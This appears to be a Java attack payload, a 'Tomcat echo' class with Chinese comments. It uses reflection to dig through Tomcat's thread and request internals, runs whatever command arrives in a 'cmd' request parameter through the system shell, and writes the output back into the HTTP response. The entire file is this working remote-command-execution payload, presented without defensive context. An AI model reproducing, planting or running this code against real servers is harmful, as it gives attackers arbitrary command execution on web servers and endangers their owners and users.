package com.echo;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class TomcatEcho3 {
    public void testDemo() throws Exception {
        Thread thread = Thread.currentThread();
        try {
            //获取group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup = (ThreadGroup) group.get(thread);

            //获取thread
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1 = (Thread[]) threads.get(threadGroup);

            //获取target
            for (Thread thread2 : thread1) {
                if (thread2.getName().contains("http-nio") && thread2.getName().contains("ClientPoller")) {
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object handler1 = handler.get(o1);

                    Field global = handler1.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(handler1);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfo_list) {
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();
                        java.io.Writer w = response2.getWriter();

                        String cmd = request2.getParameter("cmd");
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        w.write(output);
                        w.flush();
                        Field responseField = ResponseFacade.class.getDeclaredField("response");
                        responseField.setAccessible(true);
                        Field usingWriter = Response.class.getDeclaredField("usingWriter");
                        usingWriter.setAccessible(true);
                        usingWriter.set(response2, Boolean.FALSE);
                    }
                }
            }
        } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException e) {
            //e.printStackTrace();
        }
    }
}
